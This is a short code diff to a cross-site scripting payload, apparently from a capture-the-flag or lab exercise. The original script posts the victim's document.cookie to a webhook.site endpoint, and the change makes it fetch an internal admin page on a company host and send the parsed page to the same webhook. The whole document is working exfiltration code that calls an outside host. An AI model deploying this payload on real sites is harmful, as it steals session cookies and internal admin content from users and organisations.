@@ -1,7 +1,20 @@
 <script>
+
+
+
+
+
+
+  const html = await (await fetch('https://internal.sketchycompany.upd-dcs.work/admin')).text();
+ 
+  const doc = new DOMParser().parseFromString(
+    html, 'text/html'
+  );
+
+  
   fetch(`https://webhook.site/d32f86da-0fa6-4bca-808c-d1384cbde973`, {
     method: "POST",
-    body: document.cookie
+    body: doc
   })
 </script>
 
